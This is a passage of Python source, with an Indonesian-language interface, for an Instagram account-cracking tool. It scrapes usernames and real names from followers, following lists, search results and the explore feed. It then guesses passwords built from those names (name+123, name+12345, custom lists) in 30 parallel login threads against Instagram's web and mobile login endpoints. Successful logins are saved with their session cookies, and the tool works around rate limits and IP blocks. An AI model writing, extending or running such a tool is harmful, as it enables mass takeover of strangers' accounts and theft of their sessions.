    prints(Panel(f'\t\t\t\t [bold]{H2}[{P2}06{H2}]{P2}. cek hasil {H2}Crack{P2}', title=f'{M2}•{K2}•{H2}•{P2} RESULT {H2}•{K2}•{M2}•{P2}', width=94, padding=(0, 2), style='bold red'))
    
    apa = input(f'{M}└──➣  {P}Pilih :{H} ')
    if apa in ['1', '01']:
        Pengikut(coki)
    elif apa in ['2', '02']:
        Mengikuti(coki)
    elif apa in ['3', '03']:
        Pencarian(coki)
    elif apa in ['4', '04']:
        Timeline(coki)
    elif apa in ['5', '05']:
        Crack_ulang()
    elif apa in ['6', '06']:
        cek_hasil()
    elif apa in ['10', '0']:
        os.remove('.cookie_ig.txt')
        load()
    else:
        exit(f'[{M}!{P}] OK')

def pengguna_open():
    prints(Panel(f'\t\t[bold]{H2}{P2}Fitur ini khusus untuk pengguna {H2}open source{P2}', title=f'{M2}•{K2}•{H2}•{P2} FITUR SPESIAL {H2}•{K2}•{M2}•{P2}', width=94, padding=(0, 2), style='bold red'))
    exit()

def cek_hasil():
    no, nom = (0, [])
    prints(Panel(f'\t\t\t\t [bold]{P2}[{ran_rich}01{P2}]. cek hasil {H2}akun ok{P2}\n\t\t\t\t [{ran_rich}02{P2}]. cek hasil {K2}akun cp{P2}\n\t\t\t\t [{ran_rich}03{P2}]. kembali {H2}ke menu{P2}', title=f'{M2}•{K2}•{H2}•{P2} RESULT {H2}•{K2}•{M2}•{P2}', width=94, padding=(0, 2), style='bold red'))
    one = input(f'{M}└──➣  {P}Pilih :{H} ')
    
    if one in ['1', '01']:
        try:
            ok = os.listdir('WALKER')
        except:
            print(f' [{M}!{P}] tidak hasil')
            exit()
        
        for x in ok:
            if 'OK' in str(x):
                nom.append(x)
                no += 1
                try:
                    jum = open('WALKER/' + x, 'r').readlines()
                    print(f' [{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')
                except:
                    pass
        
        abc = input(f'{M}└──➣  {P}Masukan Nomor File :{H} ')
        try:
            file = nom[int(abc) - 1]
            buka = open('WALKER/' + file, 'r').readlines()
        except:
            print(f'[{M}!{P}] file tidak ada hasil ok')
            exit()
        
        for data in buka:
            try:
                user = data.split('|')[0].replace(' ', '')
                pw = data.split('|')[1].replace(' ', '')
                pg = data.split('|')[2].replace(' ', '')
                mg = data.split('|')[3].replace(' ', '')
                akun = Tree(f' [bold white]{H2}{file}{P2}')
                akun.add(f' [bold white]username   : {H2}{user}')
                akun.add(f' [bold white]password   : {H2}{pw}')
                akun.add(f' [bold white]followers  : {H2}{pg}')
                akun.add(f' [bold white]following  : {H2}{mg}')
                prints(akun)
            except:
                try:
                    user = data.split('|')[0].replace(' ', '')
                    pw = data.split('|')[1].replace(' ', '')
                    pg = data.split('|')[2].replace(' ', '')
                    mg = data.split('|')[3].replace(' ', '')
                    ps = data.split('|')[4].replace(' ', '')
                    akun = Tree(f' [bold white]{H2}{file}{P2}')
                    akun.add(f' [bold white]username   : {H2}{user}')
                    akun.add(f' [bold white]password   : {H2}{pw}')
                    akun.add(f' [bold white]followers  : {H2}{pg}')
                    akun.add(f' [bold white]following  : {H2}{mg}')
                    akun.add(f' [bold white]postingan  : {H2}{ps}')
                    prints(akun)
                except:
                    pass
        exit()
    
    elif one in ['2', '02']:
        try:
            ok = os.listdir('WALKER')
        except:
            sys.exit(f'[{M}!{P}] tidak hasil')
        
        for x in ok:
            if 'CP' in str(x):
                nom.append(x)
                no += 1
                try:
                    jum = open('WALKER/' + x, 'r').readlines()
                    print(f' [{K}{no}{P}] {x} - {K}{len(jum)} {P}akun')
                except:
                    pass
        
        abc = input(f'{M}└──➣  {P}Masukan Nomor File :{H} ')
        try:
            file = nom[int(abc) - 1]
            buka = open('WALKER/' + file, 'r').readlines()
        except:
            print(f'[{M}!{P}] file tidak ada hasil cp')
            exit()
        
        for data in buka:
            try:
                user = data.split('|')[0].replace(' ', '')
                pw = data.split('|')[1].replace(' ', '')
                pg = data.split('|')[2].replace(' ', '')
                mg = data.split('|')[3].replace(' ', '')
                akun = Tree(f' [bold white]{K2}{file}{P2}')
                akun.add(f' [bold white]username   : {K2}{user}')
                akun.add(f' [bold white]password   : {K2}{pw}')
                akun.add(f' [bold white]followers  : {K2}{pg}')
                akun.add(f' [bold white]following  : {K2}{mg}')
                prints(akun)
            except:
                pass
        exit()
    else:
        print(f'[{M}!{P}] isi yang benar')
        time.sleep(2)
        back()

class Timeline:
    def __init__(self, cookie):
        self.r = requests.Session()
        self.hd = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3', 'x-ig-app-id': '936619743392459'}
        self.cok = {'cookie': cookie}
        prints(Panel(f'               {P2}Rekomendasi Jumlah Maksimal Dump Id Di Bawah {H2}2.500{P2} Id {H2}!!!', width=94, padding=(0, 2), style='red'))
        self.limit = int(input(f'{M}└──➣  {P}Jumlah Limit  :{H} '))
        self.dump()

    def dump(self):
        try:
            rozh = ses.get('https://www.instagram.com/api/v1/discover/web/explore_grid/?is_prefetch=false&omit_cover_media=false&module=explore_popular&use_sectional_payload=true&include_fixed_destinations=true', headers=self.hd, cookies=self.cok).json()
            for data in re.findall('\'username\': \'(.*?)\', \'full_name\': \'(.*?)\'', str(rozh)):
                if '{' in str(data[0]) or '{' in str(data[1]):
                    continue
                if data[0] + '|' + data[1] in dump:
                    break
                if len(data[1]) < 4:
                    break
                dump.append(data[0] + '|' + data[1])
                print('\r%s\x1b[1;91m└──➣%s  Dump Timeline :\x1b[1;92m %s' % (C, P, len(dump)), end='')
                if len(dump) >= self.limit:
                    print('\r%s\x1b[1;91m└──➣%s  Dump Timeline :\x1b[1;92m %s' % (C, P, len(dump)))
                    atur_sandi()
                sys.stdout.flush()
            self.dump()
        except KeyboardInterrupt:
            print('\r%s\x1b[1;91m└──➣%s  Dump Timeline :\x1b[1;92m %s' % (C, P, len(dump)))
            atur_sandi()
        except Exception as e:
            if len(dump) <= 100:
                print('gagal dump')
                time.sleep(2)
                back()
            else:
                print('\r%s\x1b[1;91m└──➣%s  Dump Timeline :\x1b[1;92m %s' % (C, P, len(dump)))
                atur_sandi()
class Crack_ulang:
    def __init__(self):
        prints(Panel(f'                 {P2}Silahkan Pilih Nomor Yang Ingin Di {H2}Crack{P2} Ulang {H2}!!!', width=94, padding=(0, 2), style='red'))
        nom, no = ([], 0)
        try:
            ook = os.listdir('WALKER')
        except:
            sys.exit(f'{M}└──➣  {P}File Tidak Ada {M}!!!')
        
        for x in ook:
            if 'CP' in str(x):
                nom.append(x)
                no += 1
                try:
                    jum = open('WALKER/' + x, 'r').readlines()
                    prints(Panel(f'{H2}[{P2}{no}{H2}]{K2} {x} - {P2}{len(jum)} {K2}akun', width=94, padding=(0, 2), style='red'))
                except:
                    pass
        
        abc = input(f'{M}└──➣  {P}Masukan Nomor :{H} ')
        try:
            file = nom[int(abc) - 1]
            buka = open('WALKER/' + file, 'r').readlines()
        except:
            print(f'[{M}!{P}] file tidak ada hasil cp')
            exit()
        
        tanggal = f'{hari}-{bulan}-{tahun}.txt'
        prints(Panel(f'\t\t     {P2}hasil ok di : {H2}WALKER/OK-{tanggal}{P2}', width=94, padding=(0, 2), style='red'))
        
        for data in buka:
            try:
                self.user = data.split('|')[0].replace(' ', '')
                self.pw = data.split('|')[1].replace(' ', '')
                self.login()
            except:
                pass
        
        prints(Panel(f'          {P2}[{M2}!{P2}] crack telah selesai dengan jumlah ok : {H2}{ok}{P2} cp : {K2}{cp}{P2} terima kasih.', width=94, padding=(0, 2), style='red'))
        exit()

    def login(self):
        global ok, cp
        try:
            ses = requests.Session()
            timenow = str(time.time()).split('.')[0]
            csrf = ses.get('https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbgiA1rDGBtpDlahtfIqLFMvbfpUkkcJsvCqWRQrnUVnkjgdqtTsruSdtWUDQmVIeTULaH-_PgOKISCM5FjL2-b79JSdphmpe7ygAa_X-4q-PInTf_20Eg9l&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Fconnected_experiences%252Fcross_posting%252F', allow_redirects=True).cookies['csrftoken']
            mid = None
            head = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': f'ig_cb=1; csrftoken={csrf}; rur=FTW; mid={mid}',
                'hosts': 'www.instagram.com',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/login/?source=auth_switcher',
                'user-agent': zoco(),
                'x-csrftoken': csrf,
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '1007064846',
                'x-requested-with': 'XMLHttpRequest'
            }
            date = {
                'username': self.user,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timenow}:{self.pw}',
                'queryParams': '{"source":"auth_switcher"}',
                'optIntoOneTap': 'false',
                'next': 'https://www.instagram.com/accounts/access_tool/logins'
            }
            po = ses.post('https://www.instagram.com/accounts/login/ajax/', headers=head, data=date)
            
            if 'userId' in str(po.text):
                ok += 1
                try:
                    dt = ses.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.user}', headers={'user-agent': 'Instagram 38.0.0.22.117 Android (33/11; 480dpi; 1080x1920; vivo; vivo V3Max; V3Max; qcom; id_ID; 371827231))', 'x-ig-app-id': '936619743392459'}).json()['data']['user']
                except:
                    dt = ''
                
                try:
                    na = dt['full_name']
                except:
                    na = '-'
                
                try:
                    pg = dt['edge_followed_by']['count']
                except:
                    pg = '0'
                
                try:
                    mg = dt['edge_follow']['count']
                except:
                    mg = '0'
                
                try:
                    ps = dt['edge_owner_to_timeline_media']['count']
                except:
                    ps = '0'
                
                akun = Tree(f' [bold white]{H2}akun tidak checkpoint{P2}')
                coki = ';'.join([key + '=' + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
                akun.add(f' [bold white]username   : {H2}{self.user}')
                akun.add(f' [bold white]password   : {H2}{self.pw}')
                akun.add(f' [bold white]followers  : {H2}{pg}')
                akun.add(f' [bold white]following  : {H2}{mg}')
                akun.add(f' [bold white]postingan  : {H2}{ps}')
                akun.add(f' [bold white]{H2}{coki}')
                prints(akun)
                open(sim_ok, 'a').write('%s | %s | %s | %s \n' % (self.user, self.pw, pg, mg))
            
            elif 'checkpoint_url' in str(po.text):
                cp += 1
                akun = Tree(f' [bold white]{K2}akun checkpoint{P2}')
                akun.add(f' [bold white]username   : {K2}{self.user}')
                akun.add(f' [bold white]password   : {K2}{self.pw}')
                prints(akun)
            
            elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(po.text):
                input(f' [{C}!{P}] mode pesawat 5 detik lalu enter.')
                self.login()
            
            elif 'Kesalahan' in str(po.text):
                input(f' [{C}!{P}] mode pesawat 5 detik lalu enter.')
                self.login()
            
            elif 'ip_block' in str(po.text):
                input(f' [{C}!{P}] mode pesawat 5 detik lalu enter.')
                self.login()
            
            elif 'Maaf, terdapat masalah pada permintaan Anda.' in str(po.text):
                input(f' [{C}!{P}] mode pesawat 5 detik lalu enter.')
                self.login()
            
            else:
                akun = Tree(f' [bold white]{M2}akun salah sandi{P2}')
                akun.add(f' [bold white]username   : {M2}{self.user}')
                akun.add(f' [bold white]password   : {M2}{self.pw}')
                prints(akun)
        
        except requests.exceptions.ConnectionError:
            input(f' [{C}!{P}] jika sudah ada jaringan silahkan enter.')
            self.login()
        
        except Exception as e:
            return None

class Pengikut:
    def __init__(self, cookie):
        self.r = requests.Session()
        self.hd = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3', 'x-ig-app-id': '936619743392459'}
        self.cok = {'cookie': cookie}
        self.dump()

    def dump(self):
        prints(Panel(f'                              {P2}Masukan {H2}Username {P2}Target {H2}!!!', width=94, padding=(0, 2), style='red'))
        user = input(f'{M}└──➣  {P}Username :{H} ')
        if 'https' in user or 'instagram' in user:
            user = user.split('/')[3].split('?')[0]
        else:
            user = user
        
        self.id, na = get_id(user, self.cok)
        tol = Console()
        walker = []
        walker.append(Panel(f'{H2}             {na}', title=f'{P2}Nama', width=47, padding=(0, 2), style='red'))
        walker.append(Panel(f'{H2}                {self.id}', title=f'{P2}User Id', width=46, padding=(0, 2), style='red'))
        tol.print(Columns(walker))
        
        try:
            link = self.r.get(f'https://b.i.instagram.com/api/v1/friendships/{self.id}/followers/?count=100', headers=self.hd, cookies=self.cok).json()
            for x in link['users']:
                if len(x['full_name']) <= 3:
                    continue
                dump.append(x['username'] + '|' + x['full_name'])
            self.max = link['next_max_id']
            self.main_dump()
        except KeyboardInterrupt:
            print('\r%s\x1b[1;91m└──➣%s  Dump Pengikut :\x1b[1;92m %s' % (C, P, len(dump)))
            atur_sandi()
        except Exception as e:
            if len(dump) <= 100:
                print('gagal dump')
                time.sleep(2)
                back()
            else:
                print('\r%s\x1b[1;91m└──➣%s  Dump Pengikut :\x1b[1;92m %s' % (C, P, len(dump)))
                atur_sandi()

    def main_dump(self):
        try:
            link = self.r.get(f'https://b.i.instagram.com/api/v1/friendships/{self.id}/followers/?count=100&max_id={self.max}', headers=self.hd, cookies=self.cok).json()
            for x in link['users']:
                if len(x['full_name']) <= 3:
                    continue
                if x['username'] + '|' + x['full_name'] in dump:
                    break
                dump.append(x['username'] + '|' + x['full_name'])
                print('\r%s\x1b[1;91m└──➣%s  Dump Pengikut :\x1b[1;92m %s' % (C, P, len(dump)), end='')
                sys.stdout.flush()
            self.max = link['next_max_id']
            self.main_dump()
        except Exception as e:
            return None

class Mengikuti:
    def __init__(self, cookie):
        self.r = requests.Session()
        self.hd = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3', 'x-ig-app-id': '936619743392459'}
        self.cok = {'cookie': cookie}
        self.dump()

    def dump(self):
        prints(Panel(f'                              {P2}Masukan {H2}Username {P2}Target {H2}!!!', width=94, padding=(0, 2), style='red'))
        user = input(f'{M}└──➣  {P}Username :{H} ')
        if 'https' in user or 'instagram' in user:
            user = user.split('/')[3].split('?')[0]
        else:
            user = user
        
        self.id, na = get_id(user, self.cok)
        tol = Console()
        walker = []
        walker.append(Panel(f'{H2}             {na}', title=f'{P2}Nama', width=47, padding=(0, 2), style='red'))
        walker.append(Panel(f'{H2}                {self.id}', title=f'{P2}User Id', width=46, padding=(0, 2), style='red'))
        tol.print(Columns(walker))
        
        try:
            link = self.r.get(f'https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100', headers=self.hd, cookies=self.cok).json()
            for x in link['users']:
                if len(x['full_name']) <= 3:
                    continue
                dump.append(x['username'] + '|' + x['full_name'])
            self.max = link['next_max_id']
            self.main_dump()
        except KeyboardInterrupt:
            print('\r%s\x1b[1;91m└──➣%s  Dump Mengikuti :\x1b[1;92m %s' % (C, P, len(dump)))
            atur_sandi()
        except Exception as e:
            if len(dump) <= 100:
                print('gagal dump')
                time.sleep(2)
                back()
            else:
                print('\r%s\x1b[1;91m└──➣%s  Dump Mengikuti :\x1b[1;92m %s' % (C, P, len(dump)))
                atur_sandi()

    def main_dump(self):
        try:
            link = self.r.get(f'https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100&max_id={self.max}', headers=self.hd, cookies=self.cok).json()
            for x in link['users']:
                if len(x['full_name']) <= 3:
                    continue
                if x['username'] + '|' + x['full_name'] in dump:
                    break
                dump.append(x['username'] + '|' + x['full_name'])
                print('\r%s\x1b[1;91m└──➣%s  Dump Mengikuti :\x1b[1;92m %s' % (C, P, len(dump)), end='')
                sys.stdout.flush()
            self.max = link['next_max_id']
            self.main_dump()
        except Exception as e:
            return None

class Pencarian:
    def __init__(self, cookie):
        self.r = requests.Session()
        self.cok = {'cookie': cookie}
        self.hd = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3', 'x-ig-app-id': '936619743392459'}
        self.main()

def ua_rozh():
    rc = random.choice
    devices = ['SM-G973F', 'SM-A505F', 'SM-G770F', 'SM-N975F', 'SM-A715F']
    androids = ['29/10', '30/11', '31/12', '33/14']
    dpis = ['480', '420', '400', '380']
    resolutions = ['1080x1920', '1080x2160', '720x1280', '1440x2560']
    
    device = rc(devices)
    android = rc(androids)
    dpi = rc(dpis)
    res = rc(resolutions)
    
    return f'Instagram 276.0.0.0.0 Android ({android}; {dpi}dpi; {res}; samsung; {device}; {device}; exynos5; en_US; 448817182)'


    def main(self):
        prints(Panel(f'                 {P2}Silahkan Masukan Nama Gunakan {H2}Koma {P2}Untuk Pemisah {H2}!!!', width=94, padding=(0, 2), style='red'))
        list_names = input(f'{M}└──➣  {P}Masukan Nama :{H} ').split(',')
        for nama in list_names:
            try:
                response = self.r.get('https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query=%s&rank_token=0.11856792192547738&include_reel=true' % nama, cookies=self.cok, headers=self.hd).json()
                for x in response['users']:
                    if len(x['user']['full_name']) <= 3:
                        continue
                    if x['user']['username'] + '|' + x['user']['full_name'] in dump:
                        continue
                    dump.append(x['user']['username'] + '|' + x['user']['full_name'])
                    print('\r%s\x1b[1;91m└──➣%s  Dump Pencarian :\x1b[1;92m %s' % (C, P, len(dump)), end='')
                    time.sleep(0.04)
                    sys.stdout.flush()
            except:
                pass
        
        if len(dump) <= 0:
            exit('gagal dump')
        
        print('\r%s\x1b[1;91m└──➣%s  Dump Pencarian :\x1b[1;92m %s' % (C, P, len(dump)))
        atur_sandi()

def atur_sandi():
    global prog, des
    tampung = []
    for x in dump:
        tampung.append(x)
    dump.clear()
    for x in tampung:
        xx = random.randint(0, len(tampung) - 1)
        dump.insert(xx, x)
    
    prints(Panel(f'                              {P2}Pilihan Method Crack  {H2}!!!', width=94, padding=(0, 2), style='red'))
    tol = Console()
    walker = []
    walker.append(Panel(f'{H2}                   {P2}[{H2}A{P2}]', title=f'{H2}METHOD-API', width=47, padding=(0, 2), style='red'))
    walker.append(Panel(f'{H2}                  {P2}[{K2}R{P2}]', title=f'{K2}METHODE-REGULAR', width=46, padding=(0, 2), style='red'))
    tol.print(Columns(walker))
    metode = input(f'{M}└──➣  {P}Pilih :{H} ')
    
    prints(Panel(f'{H2}[{P2}1{H2}]{M2}. {P2}Password-V1       {H2}({P2}No Recomended{H2})\n{H2}[{P2}2{H2}]{M2}. {P2}Password-V2       {H2}({P2}Recomended{H2})\n{H2}[{P2}3{H2}]{M2}. {P2}Password-V3       {H2}({P2}Recomended{H2})\n{H2}[{P2}4{H2}]{M2}. {P2}Password Costum   {H2}({P2}Very Recomended{H2})', title=f'{H2}PASSWORD', width=94, padding=(0, 2), style='red'))
    
    apa = input(f'{M}└──➣  {P}PASSWORD :{H} ')
    manual = []
    bk = []
    
    if apa in ['4', '04', '5', '05']:
        prints(Panel(f'{P2}Masukan Sandi Manual Gunakan Koma sebagai Pemisah Contoh,\"{H2}bismillah,sayang123{P2}\" Maksimal 3', title=f'{H2}PASSWORD-MANUAL', width=94, padding=(0, 2), style='red'))
        manual = input(f'{M}└──➣  {P}Masukan sandi Huruf:{H} ').split(',')
        prints(Panel(f'{P2}Masukan Sandi Belakang Nama Gunakan Koma sebagai Pemisah Contoh,\"{H2}21,22,23{P2}\" Maksimal 10', title=f'{H2}PASSWORD-ANGKA', width=94, padding=(0, 2), style='red'))
        bk = input(f'{M}└──➣ {P}Masukan sandi angka :{H} ').split(',')
    
    prints(Panel(f'                              {P2}Tampilkan {H2}Informasi {P2}Akun? {H2}!!!', width=94, padding=(0, 2), style='red'))
    tol = Console()
    walker = []
    walker.append(Panel(f'{H2}                 {P2}[{H2}O{P2}]{M2}. {H2}OK', title=f'{H2}RECOMENDED', width=47, padding=(0, 2), style='red'))
    walker.append(Panel(f'{H2}                 {P2}[{K2}N{P2}]{M2}. {K2}NO', title=f'{K2}NO-RECOMENDED', width=46, padding=(0, 2), style='red'))
    tol.print(Columns(walker))
    bbz = input(f'{M}└──➣  {P}Pilih  :{H} ')
    
    if bbz in ['o', '1', '01', 'yy', 'O', 'oO', 'OK', 'ok']:
        pilih_info.append('yes')
    else:
        pilih_info.append('no')
    
    tanggal = f'{hari}-{bulan}-{tahun}.txt'
    prints(Panel(f'\t\t     {H2}OK IN : {H2}WALKER/OK-{tanggal}{P2}\n\t\t     {K2}CP IN : {K2}WALKER/CP-{tanggal}{P2}', width=94, padding=(0, 5), style='red'))
    
    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'), TimeElapsedColumn())
    des = prog.add_task('', total=len(dump))
    
    with prog:
        with ThreadPoolExecutor(max_workers=30) as babas:
            for akun in dump:
                user, nama = (akun.split('|')[0], akun.split('|')[1].lower())
                dp = nama.split(' ')[0]
                
                if apa in ['1', '01']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '123']
                    else:
                        pwx = [nama, nama.replace(' ', ''), dp + '123']
                
                elif apa in ['2', '02']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '12345']
                    else:
                        pwx = [nama, nama.replace(' ', ''), dp + '12345']
                
                elif apa in ['3', '03']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '123', nama.replace(' ', '') + '12345']
                    else:
                        pwx = [nama, nama.replace(' ', ''), dp + '123', dp + '1234', dp + '12345', dp + '123456']
                
                elif apa in ['4', '04']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = manual
                    else:
                        kombo = []
                        pwx = [nama.replace(' ', ''), nama] + manual
                        for x in bk:
                            kombo.append(str(dp) + str(x))
                        pwx = pwx + kombo
                
                else:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '123', nama.replace(' ', '') + '12345']
                    else:
                        pwx = [nama.replace(' ', ''), dp + '123', dp + '1234', dp + '12345']
                
                if metode in ['r', 'R', 'regular', 'Regular']:
                    babas.submit(Mengheker, user, pwx)
                else:
                    babas.submit(MetodApi, user, pwx)

    prints(Panel(f'                              Hasil Crack Instagram OK : {H2}{ok}{P2} CP : {K2}{cp}{P2}', width=94, padding=(0, 2), style='red'))
    exit()

def Mengheker(user, pewe):
    global ok, cp, loop
    sesion = 0
    if sesion > 0:
        sesion = 0
    
    ses = requests.Session()
    loop += 1
    prog.update(des, description=f'{P2}[{H2}aman{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}')
    prog.advance(des)
    
    rr = random.randint
    ua_fake = f'Instagram {str(rr(100, 250))}.1.0.16.113 Android (33/{str(rr(5, 9))}; 420dpi; 1080x2156; BLD/Blade; BLD{str(rr(1111, 5555))}; Ahmed; Alzwage; en_GB; 387809238)'
    
    for pw in pewe:
        try:
            timenow = str(time.time()).split('.')[0]
            head = {
                'User-Agent': ua_fake,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-IG-App-ID': '936619743392459',
                'X-IG-WWW-Claim': '0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.instagram.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
            
            data = {
                'username': user,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timenow}:{pw}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}'
            }
            
            response = ses.post('https://www.instagram.com/accounts/login/ajax/', headers=head, data=data, timeout=30)
            response_data = response.json()
            
            if response_data.get('authenticated'):
                ok += 1
                if 'yes' in pilih_info:
                    na, pg, mg, ps = cek_info(user)
                else:
                    na, pg, mg, ps = ('-', '0', '0', '0')
                
                cookies_dict = ses.cookies.get_dict()
                coki = '; '.join([f'{k}={v}' for k, v in cookies_dict.items()])
                
                akun = Tree(f' [bold white]{H2}LOGIN BERHASIL{P2}')
                akun.add(f' [bold white]Username  : {H2}{user}')
                akun.add(f' [bold white]Password  : {H2}{pw}')
                akun.add(f' [bold white]Followers : {H2}{pg}')
                akun.add(f' [bold white]Following : {H2}{mg}')
                akun.add(f' [bold white]Posts     : {H2}{ps}')
                akun.add(f' [bold white]Cookie    : {H2}{coki[:50]}...')
                prints(akun)
                
                open(sim_ok, 'a').write(f'{user}|{pw}|{pg}|{mg}|{ps}|{coki}\n')
                break
                
            elif response_data.get('checkpoint_required'):
                cp += 1
                akun = Tree(f' [bold white]{K2}CHECKPOINT{P2}')
                akun.add(f' [bold white]Username : {K2}{user}')
                akun.add(f' [bold white]Password : {K2}{pw}')
                prints(akun)
                open(sim_cp, 'a').write(f'{user}|{pw}\n')
                break
                
            elif 'Please wait a few minutes before you try again' in str(response_data):
                time.sleep(60)
                continue
                
            elif 'ip_block' in str(response_data):
                time.sleep(300)
                continue
                
        except Exception as e:
            continue

def MetodApi(user, pewe):
    global ok, cp, loop
    sesion = 0
    if sesion > 0:
        sesion = 0
    
    ses = requests.Session()
    loop += 1
    prog.update(des, description=f'{P2}[{H2}api{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}')
    prog.advance(des)
    
    for pw in pewe:
        try:
            headers = {
                'User-Agent': 'Instagram 148.0.0.33.121 Android (28/9; 320dpi; 720x1468; samsung; SM-A105F; a10; exynos7885; en_GB; 245490542)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'X-FB-HTTP-Engine': 'Liger'
            }
            
            device_id = f"android-{''.join(random.choices('0123456789abcdef', k=16))}"
            
            data = {
                'jazoest': '22507',
                'phone_id': str(uuid.uuid4()),
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pw}',
                'username': user,
                'adid': str(uuid.uuid4()),
                'guid': str(uuid.uuid4()),
                'device_id': device_id,
                'cpl': 'true',
                'login_attempt_count': '0'
            }
            
            sig_data = f"signed_body=SIGNATURE.{json.dumps(data)}"
            
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', 
                              data=sig_data, headers=headers, timeout=30)
            
            response_data = response.json()
            
            if response_data.get('status') == 'ok' and 'logged_in_user' in response_data:
                ok += 1
                if 'yes' in pilih_info:
                    na, pg, mg, ps = cek_info(user)
                else:
                    na, pg, mg, ps = ('-', '0', '0', '0')
                
                cookies_dict = ses.cookies.get_dict()
                sessionid = cookies_dict.get('sessionid', '')
                user_id = response_data['logged_in_user']['pk']
                
                akun = Tree(f' [bold white]{H2}API LOGIN BERHASIL{P2}')
                akun.add(f' [bold white]Username  : {H2}{user}')
                akun.add(f' [bold white]Password  : {H2}{pw}')
                akun.add(f' [bold white]User ID   : {H2}{user_id}')
                akun.add(f' [bold white]Followers : {H2}{pg}')
                akun.add(f' [bold white]Following : {H2}{mg}')
                akun.add(f' [bold white]Posts     : {H2}{ps}')
                prints(akun)
                
                open(sim_ok, 'a').write(f'{user}|{pw}|{pg}|{mg}|{ps}|{sessionid}\n')
                break
                
            elif response_data.get('message') == 'checkpoint_required':
                cp += 1
                akun = Tree(f' [bold white]{K2}API CHECKPOINT{P2}')
                akun.add(f' [bold white]Username : {K2}{user}')
                akun.add(f' [bold white]Password : {K2}{pw}')
                prints(akun)
                open(sim_cp, 'a').write(f'{user}|{pw}\n')
                break
                
            elif 'challenge_required' in str(response_data):
                cp += 1
                akun = Tree(f' [bold white]{K2}API CHALLENGE{P2}')
                akun.add(f' [bold white]Username : {K2}{user}')
                akun.add(f' [bold white]Password : {K2}{pw}')
                prints(akun)
                open(sim_cp, 'a').write(f'{user}|{pw}\n')
                break
                
        except Exception as e:
            continue

def get_hmac():
    rc = random.choices
    A = ''.join(rc('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=17))
    B = ''.join(rc('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=10))
    C = ''.join(rc('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=10))
    D = ''.join(rc('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=7))
    return f'hmac.{A}-{B}-{C}-{D}-'

def cek_info(user):
